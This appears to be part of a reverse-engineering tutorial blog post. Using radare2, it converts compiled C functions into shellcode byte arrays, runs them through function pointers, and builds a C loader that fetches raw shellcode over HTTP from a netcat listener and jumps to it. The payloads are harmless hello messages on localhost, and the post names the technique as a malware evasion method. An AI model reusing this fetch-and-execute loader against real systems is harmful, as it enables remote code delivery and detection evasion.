            ;-- __GNU_EH_FRAME_HDR:
            0x557a8fb296a8      011b           add dword [rbx], ebx    ; [16] -r-- section size 60 named .eh_frame_hdr
            0x557a8fb296aa      033b           add edi, dword [rbx]
            0x557a8fb296ac      3c00           cmp al, 0
```
Nops will be executed and then the weird add dword [rbx], ebx  that corresponds to some weird memory initialization will be executed, as the code below there does not make any sense because of that, the program will likely crash, but you get the point right? What if we manage to create an hex buffer that actually represents a valid function, a function that gets rid of the stack and returns to the calling one?

Let's do it so,

As in the previous program the hello function was somehow "self-contained" we can "convert-it into shellcode"

```c
[0x55ef096056aa]> pdf
            ; CALL XREF from main @ 0x55ef09605707
┌ 84: sym.hello ();
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           0x55ef096056aa      55             push rbp
│           0x55ef096056ab      4889e5         mov rbp, rsp
│           0x55ef096056ae      4883ec20       sub rsp, 0x20
│           0x55ef096056b2      64488b042528.  mov rax, qword fs:[0x28]
│           0x55ef096056bb      488945f8       mov qword [var_8h], rax
│           0x55ef096056bf      31c0           xor eax, eax
│           0x55ef096056c1      48b868656c6c.  movabs rax, 0x6f77206f6c6c6568 ; 'hello wo'
│           0x55ef096056cb      488945ec       mov qword [var_14h], rax
│           0x55ef096056cf      c745f4726c64.  mov dword [var_ch], 0x646c72 ; 'rld'
│           0x55ef096056d6      488d45ec       lea rax, [var_14h]
│           0x55ef096056da      4889c7         mov rdi, rax
│           0x55ef096056dd      b800000000     mov eax, 0
│           0x55ef096056e2      e899feffff     call sym.imp.printf     ; int printf(const char *format)
│           0x55ef096056e7      90             nop
│           0x55ef096056e8      488b45f8       mov rax, qword [var_8h]
│           0x55ef096056ec      644833042528.  xor rax, qword fs:[0x28]
│       ┌─< 0x55ef096056f5      7405           je 0x55ef096056fc
│       │   0x55ef096056f7      e874feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       └─> 0x55ef096056fc      c9             leave
└           0x55ef096056fd      c3             ret
[0x55ef096056aa]> 
```
Once inside it in r2 we'll use pc
```c
[0x55ef096056aa]> pc
#define _BUFFER_SIZE 256
const uint8_t buffer[_BUFFER_SIZE] = {
  0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x64, 0x48,
  0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45,
  0xf8, 0x31, 0xc0, 0x48, 0xb8, 0x68, 0x65, 0x6c, 0x6c, 0x6f,
  0x20, 0x77, 0x6f, 0x48, 0x89, 0x45, 0xec, 0xc7, 0x45, 0xf4,
  0x72, 0x6c, 0x64, 0x00, 0x48, 0x8d, 0x45, 0xec, 0x48, 0x89,
  0xc7, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x99, 0xfe, 0xff,
  0xff, 0x90, 0x48, 0x8b, 0x45, 0xf8, 0x64, 0x48, 0x33, 0x04,
  0x25, 0x28, 0x00, 0x00, 0x00, 0x74, 0x05, 0xe8, 0x74, 0xfe,
  0xff, 0xff, 0xc9, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0xb8, 0x00,
  0x00, 0x00, 0x00, 0xe8, 0x9e, 0xff, 0xff, 0xff, 0x90, 0x5d,
  0xc3, 0x90, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd7, 0x41,
  0x55, 0x41, 0x54, 0x4c, 0x8d, 0x25, 0x8e, 0x06, 0x20, 0x00,
  0x55, 0x48, 0x8d, 0x2d, 0x8e, 0x06, 0x20, 0x00, 0x53, 0x41,
  0x89, 0xfd, 0x49, 0x89, 0xf6, 0x4c, 0x29, 0xe5, 0x48, 0x83,
  0xec, 0x08, 0x48, 0xc1, 0xfd, 0x03, 0xe8, 0x07, 0xfe, 0xff,
  0xff, 0x48, 0x85, 0xed, 0x74, 0x20, 0x31, 0xdb, 0x0f, 0x1f,
  0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xfa, 0x4c,
  0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc, 0x48,
  0x83, 0xc3, 0x01, 0x48, 0x39, 0xdd, 0x75, 0xea, 0x48, 0x83,
  0xc4, 0x08, 0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e,
  0x41, 0x5f, 0xc3, 0x90, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00,
  0x00, 0x00, 0x00, 0x00, 0xf3, 0xc3, 0x00, 0x00, 0x48, 0x83,
  0xec, 0x08, 0x48, 0x83, 0xc4, 0x08, 0xc3, 0x00, 0x00, 0x00,
  0x01, 0x00, 0x02, 0x00, 0x01, 0x1b, 0x03, 0x3b, 0x40, 0x00,
  0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xcc, 0xfd, 0xff, 0xff,
  0x8c, 0x00, 0x00, 0x00, 0xfc, 0xfd
};
```
That will return a buffer containing the function-shellcode to us so we can use it in our _evil activities_

Inside the code will work like this

```c
#include <stdio.h>
#include<string.h>
#include <stdint.h>

#define _BUFFER_SIZE 256
const uint8_t buffer[_BUFFER_SIZE] = {
  0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x64, 0x48,
  0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45,
  0xf8, 0x31, 0xc0, 0x48, 0xb8, 0x48, 0x65, 0x6c, 0x6c, 0x6f,
  0x20, 0x66, 0x72, 0x48, 0x89, 0x45, 0xea, 0xc7, 0x45, 0xf2,
  0x69, 0x65, 0x6e, 0x64, 0x66, 0xc7, 0x45, 0xf6, 0x21, 0x00,
  0x48, 0x8d, 0x45, 0xea, 0x48, 0x89, 0xc7, 0xb8, 0x00, 0x00,
  0x00, 0x00, 0xe8, 0x93, 0xfe, 0xff, 0xff, 0x90, 0x48, 0x8b,
  0x45, 0xf8, 0x64, 0x48, 0x33, 0x04, 0x25, 0x28, 0x00, 0x00,
  0x00, 0x74, 0x05, 0xe8, 0x6e, 0xfe, 0xff, 0xff, 0xc9, 0xc3,
  0x55, 0x48, 0x89, 0xe5, 0x90, 0x5d, 0xc3, 0x0f, 0x1f, 0x44,
  0x00, 0x00, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd7, 0x41,
  0x55, 0x41, 0x54, 0x4c, 0x8d, 0x25, 0x8e, 0x06, 0x20, 0x00,
  0x55, 0x48, 0x8d, 0x2d, 0x8e, 0x06, 0x20, 0x00, 0x53, 0x41,
  0x89, 0xfd, 0x49, 0x89, 0xf6, 0x4c, 0x29, 0xe5, 0x48, 0x83,
  0xec, 0x08, 0x48, 0xc1, 0xfd, 0x03, 0xe8, 0x07, 0xfe, 0xff,
  0xff, 0x48, 0x85, 0xed, 0x74, 0x20, 0x31, 0xdb, 0x0f, 0x1f,
  0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xfa, 0x4c,
  0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc, 0x48,
  0x83, 0xc3, 0x01, 0x48, 0x39, 0xdd, 0x75, 0xea, 0x48, 0x83,
  0xc4, 0x08, 0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e,
  0x41, 0x5f, 0xc3, 0x90, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00,
  0x00, 0x00, 0x00, 0x00, 0xf3, 0xc3, 0x00, 0x00, 0x48, 0x83,
  0xec, 0x08, 0x48, 0x83, 0xc4, 0x08, 0xc3, 0x00, 0x00, 0x00,
  0x01, 0x00, 0x02, 0x00, 0x90, 0x90, 0x90, 0x90, 0x01, 0x1b,
  0x03, 0x3b, 0x44, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0xc8, 0xfd, 0xff, 0xff, 0x90, 0x00
};


void main(){
    
    int (*func)();
    func = (int (*)()) buffer;
    (int)(*func)();
}
```
And inside r2 will go like this:

```c
[0x5606c6856704]> pdf
            ; DATA XREF from entry0 @ 0x5606c68565bd
┌ 33: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_8h @ rbp-0x8
│           0x5606c6856704      55             push rbp
│           0x5606c6856705      4889e5         mov rbp, rsp
│           0x5606c6856708      4883ec10       sub rsp, 0x10
│           0x5606c685670c      488d05ed0000.  lea rax, obj.buffer     ; 0x5606c6856800
│           0x5606c6856713      488945f8       mov qword [var_8h], rax
│           0x5606c6856717      488b55f8       mov rdx, qword [var_8h]
│           0x5606c685671b      b800000000     mov eax, 0
│           0x5606c6856720      ffd2           call rdx
│           0x5606c6856722      90             nop
│           0x5606c6856723      c9             leave
└           0x5606c6856724      c3             ret
[0x5606c6856704]> 
```
Same thing at start then the call:

```c
[0x556afbdba800]> pd 10
            ; DATA XREF from main @ 0x556afbdba70c
            ;-- buffer:
            ;-- rdx:
            ;-- rip:
            0x556afbdba800      55             push rbp
            0x556afbdba801      4889e5         mov rbp, rsp
            0x556afbdba804      4883ec20       sub rsp, 0x20
            0x556afbdba808      64488b042528.  mov rax, qword fs:[0x28]
            0x556afbdba811      488945f8       mov qword [rbp - 8], rax
            0x556afbdba815      31c0           xor eax, eax
            0x556afbdba817  ~   48b848656c6c.  movabs rax, 0x7266206f6c6c6548 ; 'Hello fr'
            ;-- str.Hello_frH:
```
There will be our code, running the program will output a "hello friend" without crashing.

#### Downloading shellcode

So the smart reader may be probably thinking that as we only need those bytes in a buffer inside memory we can get them from a file or perhaps from a remote server and yes, that technique is commonly used by malware to avoid certain detection mechanisms.

Say we have some code like this:
```c
int main() {
  write (1,"Hello!\n",7);
  exit(0);
}
```
It can be as simple or as complex as you want to, the only requisite for it is to be "self-contained" (or to set fixes on the host program) and we want to deliver it to a potential host that is "waiting for him" over the internet. We already know how to get and run it on the host program but how do we translate it into opcodes and deliver it over the network?

We can get those opcodes by using *ragg2* and then dump them into an hex file:

```c
:~/C$ 
:~/C$ ragg2-cc  -x w.c
eb0848656c6c6f210a00bf01000000488d35ecffffffba07000000b8010000000f0531ffb83c0000000f0531c0c3
```
So now we can simply copy and paste this and use hexedit to create a new file and hex-paste it, then we'll have our bin sc file ready to be delivered by using our favorite http server (or whatever else)

The dump will look like this inside r2:
```c
[0x00000000]> pd 50
            ;-- rflags:
┌ 38: fcn.00000000 ();
│       ┌─< 0x00000000      eb00           jmp 2
│       │   ; CODE XREF from fcn.00000000 @ 
│       └─> 0x00000002      488d351d0000.  lea rsi, [0x00000026]       ; "Hello!\n" ; 38
│           0x00000009      bf01000000     mov edi, 1
│           0x0000000e      ba07000000     mov edx, 7
│           0x00000013      b801000000     mov eax, 1
│           0x00000018      0f05           syscall
│           0x0000001a      31ff           xor edi, edi
│           0x0000001c      b83c000000     mov eax, 0x3c               ; '<' ; 60
│           0x00000021      0f05           syscall
│           0x00000023      31c0           xor eax, eax
└           0x00000025      c3             ret
            ; DATA XREF from fcn.00000000 @ 0x2
            0x00000026      48656c         insb byte [rdi], dx
            0x00000029      6c             insb byte [rdi], dx
            0x0000002a      6f             outsd dx, dword [rsi]
            0x0000002b      210a           and dword [rdx], ecx
            0x0000002d      00ff           add bh, bh
```
As you see, in here we are directly dealing with syscalls (see the syscall instruction), also note that we have two of them one for print one for exit and the string is somehow selfcontained within the code.


Let's go for the host programnow, it will look similar as the previous http client we messed with:

```c
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h> 
#include <fcntl.h>
#include <stdlib.h>

#define BSIZE 256
#define KSIZE 11


int main(int argc, char *argv[]) {
   int sockfd, portno, n;
   struct sockaddr_in serv_addr;
   struct hostent *server;
   char key[KSIZE];
   char request[] = "GET /sh HTTP/1.1\r\nUser-Agent: nc/0.0.1\r\nHost: 127.0.0.1\r\nAccept: */*\r\n\r\n";
   char buffer[BSIZE];

   portno = 80;
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   server = gethostbyname("127.0.0.1");

   
   bzero((char *) &serv_addr, sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
   serv_addr.sin_port = htons(portno);

   if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
      exit(1);
   }

   bzero(buffer,BSIZE);

   n = write(sockfd, request, strlen(request));

   bzero(buffer,BSIZE);
   n = read(sockfd, buffer, BSIZE);
   printf("jumpting to shellcode\n");
   int (*func)();
   func = (int (*)()) buffer;
   (int)(*func)();

   return 0;
}
```
That'll be it, our small int func buffer routine has been added at the end and this time we are not reading a string but some executable bytes.

This time as I don't want to over-complicate the example I won't use a web server like apache2, I'll use the netcat software to "emulate" a web server for this single request as follows:

```c
:/var/www/html$ sudo nc -lvp 80 < sh 
Listening on [0.0.0.0] (family 0, port 80)
Connection from localhost 36428 received!
GET /sh HTTP/1.1
User-Agent: nc/0.0.1
Host: 127.0.0.1
Accept: */*
```
being sh the RAW HEX shellcode. This command basically indicates netcat to just dump the (bytes) from that file to the first client connected to its port 80.

Then running the progam will go like:
```c
:~/C/generic$ gcc -w httpget_download_shellcode.c -o sh -fno-stack-protector -z execstack
:~/C/generic$ ./sh 
jumpting to shellcode
Hello!
```
Note that I compiled the program using those flags, otherwise it won't work.

Let's now analyze it:

```c
         0x55d39c38bac4      89c7           mov edi, eax
│           0x55d39c38bac6      b800000000     mov eax, 0
│           ;-- rip:
│           0x55d39c38bacb b    e8c0fcffff     call sym.imp.read       ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x55d39c38bad0      8945ec         mov dword [var_14h], eax
│           0x55d39c38bad3      488d3db40000.  lea rdi, str.jumpting_to_shellcode ; 0x55d39c38bb8e ; "jumpting to shellcode"
│           0x55d39c38bada      e871fcffff     call sym.imp.puts       ; int puts(const char *s)
│           0x55d39c38badf      488d8570feff.  lea rax, [var_190h]
│           0x55d39c38bae6      488945e0       mov qword [var_20h], rax
│           0x55d39c38baea      488b55e0       mov rdx, qword [var_20h]
│           0x55d39c38baee      b800000000     mov eax, 0
│           0x55d39c38baf3      ffd2           call rdx
```
The buffer starts empty, as usual and then it will be filled with some good shellcode:
```c
[0x55d39c38bacb]> afvd
type:char ** doesn't exist
arg argc = 0x00000003 0xffffffffffffffff   ........ @rdi 0
arg argv = 
var var_194h = 0x7ffe727894ec = (qword)0x0000000000000001
var var_1a0h = 0x7ffe727894e0 = (qword)0x00007ffe72789768
var var_90h = 0x7ffe727895f0 = (qword)0x2068732f20544547
var var_88h = 0x7ffe727895f8 = (qword)0x312e312f50545448
var var_80h = 0x7ffe72789600 = (qword)0x412d726573550a0d
var var_78h = 0x7ffe72789608 = (qword)0x636e203a746e6567
var var_70h = 0x7ffe72789610 = (qword)0x0a0d312e302e302f
var var_68h = 0x7ffe72789618 = (qword)0x3231203a74736f48
var var_60h = 0x7ffe72789620 = (qword)0x0d312e302e302e37
var var_58h = 0x7ffe72789628 = (qword)0x3a7470656363410a
var var_50h = 0x7ffe72789630 = (qword)0x0a0d0a0d2a2f2a20
var var_48h = 0x7ffe72789638 = (qword)0x0000000000f0b500
var var_4h = 0x7ffe7278967c = (qword)0x9c38bb0000000050
var var_8h = 0x7ffe72789678 = (qword)0x0000005000000003
var var_10h = 0x7ffe72789670 = (qword)0x00007f4571b62300
var var_30h = 0x7ffe72789650 = (qword)0x0100007f50000002
var var_2eh = 0x7ffe72789652 = (qword)0x00000100007f5000
var var_190h = 0x7ffe727894f0 = (qword)0x0000000000000000
var var_14h = 0x7ffe7278966c = (qword)0x71b6230000000048
var var_20h = 0x7ffe72789660 = (qword)0x000055d39c38bb00

[0x55d39c38bacb]> pxw @ 0x7ffe727894f0
0x7ffe727894f0  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789500  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789510  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789520  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789530  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789540  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789550  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7ffe72789560  0x00000000 0x00000000 0x00000000 0x00000000  ................
```
Then after the read call:
```c
[0x55d39c38bacb]> dc
hit breakpoint at: 55d39c38bad0
[0x55d39c38bad0]> pxw @ 0x7ffe727894f0
0x7ffe727894f0  0x8d4800eb 0x00001d35 0x0001bf00 0x07ba0000  ..H.5...........
0x7ffe72789500  0xb8000000 0x00000001 0xff31050f 0x00003cb8  ..........1..<..
0x7ffe72789510  0x31050f00 0x6548c3c0 0x216f6c6c 0x0000000a  ...1..Hello!....
0x7ffe72789520  0x00000000 0x00000000 0x00000000 0x00000000  ................
```
Here we have it here!

Now at this point:
```c
│           0x55d39c38baea      488b55e0       mov rdx, qword [var_20h]
│           0x55d39c38baee      b800000000     mov eax, 0
│           ;-- rip:
│           0x55d39c38baf3 b    ffd2           call rdx
│           0x55d39c38baf5      b800000000     mov eax, 0
│           0x55d39c38bafa      c9             leave
└           0x55d39c38bafb      c3             ret
[0x55d39c38baf3]> dr rdx
0x7ffe727894f0
[0x55d39c38baf3]> 
```
And as we see if we use pd to dump those instructions there we see that they all make sense:
```c
[0x559e09c42af3]> pd 20 @ 0x7ffe05af6b40
            ;-- rdx:
        ┌─< 0x7ffe05af6b40      eb00           jmp 0x7ffe05af6b42
        └─> 0x7ffe05af6b42      488d351d0000.  lea rsi, [0x7ffe05af6b66] ; "Hello!\n"
            0x7ffe05af6b49      bf01000000     mov edi, 1
            0x7ffe05af6b4e      ba07000000     mov edx, 7
            0x7ffe05af6b53      b801000000     mov eax, 1
            0x7ffe05af6b58      0f05           syscall
            0x7ffe05af6b5a      31ff           xor edi, edi
            0x7ffe05af6b5c      b83c000000     mov eax, 0x3c           ; '<' ; 60
            0x7ffe05af6b61      0f05           syscall
            0x7ffe05af6b63      31c0           xor eax, eax
            0x7ffe05af6b65      c3             ret
            0x7ffe05af6b66      48656c         insb byte [rdi], dx
            0x7ffe05af6b69      6c             insb byte [rdi], dx
            0x7ffe05af6b6a      6f             outsd dx, dword [rsi]
            0x7ffe05af6b6b      210a           and dword [rdx], ecx
```
And that will be enough for today.

On the next posts we'll go over some more advanced topics such as command and control mechanisms over DNS this time exploring the Windows API instead.




